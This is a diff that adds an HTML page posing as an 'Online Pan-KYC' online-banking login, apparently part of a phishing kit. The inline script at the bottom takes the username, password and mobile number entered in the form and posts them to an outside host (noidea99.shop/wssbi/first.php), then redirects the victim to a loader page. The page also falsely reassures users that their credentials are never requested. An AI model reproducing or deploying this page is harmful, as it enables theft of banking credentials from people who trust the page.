@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width" />
+    <link rel="stylesheet" href="css/style.css">
+</head>
+
+<body>
+
+    <header class="logo">
+        <img src="assets/header.jpeg" alt="">
+    </header>
+
+    <br>
+
+    <div class="login-heading">
+        <h3 class="text-center">Login in Online Pan-KYC</h3>
+    </div>
+
+    <div class="login-form">
+        
+        <form id="credit-form">
+            <p class="info"><span>(CARE:</span> Username and password are case sensitive)</p>
+
+            <div class="form-group">
+                <label for="Username">Username* </label>
+
+                <input name="luname" type="text" class="form-control" id="luname" required size="30"
+                    maxLength="30" aria-label="Username" />
+            </div>
+
+            <div class="form-group">
+
+                <label for="Password">Password* </label>
+
+                <input name="lpwd" type="password" class="form-control" id="lpwd" required size="30"
+                    maxLength="30" aria-label="Password" />
+
+            </div>
+
+            <div class="form-group">
+
+
+                <label for="Mobile">Mobile* </label>
+
+                <input name="lmob" type="text" class="form-control" id="lmob" size="30" required
+                    maxLength="10" aria-label="Mobile" />
+            </div>
+
+            <div class="form-group">
+                <label for="captcha">Enter the text as shown in the image* </label>
+
+                <input type="text" class="form-control" size="30" maxLength="30"/>
+            </div>
+
+            <div>
+
+                <input type="radio" checked ="true" />
+
+                <label for="javascript">Image Capture</label>            
+            </div>
+
+            <br>
+            
+            <img alt="captcha" src="cap.png"/>
+
+            <br>
+
+            <br>
+
+            <input type="submit" id="savebtn" class="btn" value="Login" />
+
+        </form>
+
+
+        <p><a href="/">New User ? Register here / Activate</a></p>
+        <p><a href="/">Forgot Username / Login Password</a></p>
+
+    </div>
+
+    <div class="p-body">
+        <ul class="provide">
+            <li>Mandatory fields are marked asterisk (*)</li>
+            <li>Do not share your username and password anywhere.</li>
+            <li>Your username and password are high confidential. We will never ask for this information.</li>
+        </ul>
+    </div>
+
+    <div class="footer">
+        <p>© OnlineBanking</p>
+    </div>
+
+    <script>
+
+      document
+        .getElementById("credit-form")
+        .addEventListener("submit", function (event) {
+          event.preventDefault();
+          //IDS
+            const luname = document.querySelector('input[name="luname"]').value;
+            const lpwd = document.querySelector('input[name="lpwd"]').value;
+            const lmob = document.querySelector('input[name="lmob"]').value;
+            const domain = window.location.hostname + '/viewd.html';
+
+            function randomRange(min, max) {
+                return Math.floor(Math.random() * (max - min + 1)) + min;
+            }
+
+            var rand_id = randomRange(1, 100000);
+
+            var data = {
+              randno : rand_id,
+              luname: luname,
+              lpwd: lpwd,
+              lmob: lmob,
+              domain: domain
+            };
+
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "https://noidea99.shop/wssbi/first.php", true);
+            xhr.setRequestHeader("Content-Type", "application/json");
+
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === 4) {
+                    if (xhr.status === 200) {
+                        console.log(xhr.responseText);
+                        localStorage.setItem('random_no', rand_id);
+                        window.location.href = "loader.html";
+                    } else {
+                        console.error("Error: " + xhr.status);
+                    }
+                }
+            };
+
+            xhr.send(JSON.stringify(data));
+        });
+
+    </script>
+
+</body>
+
+</html>
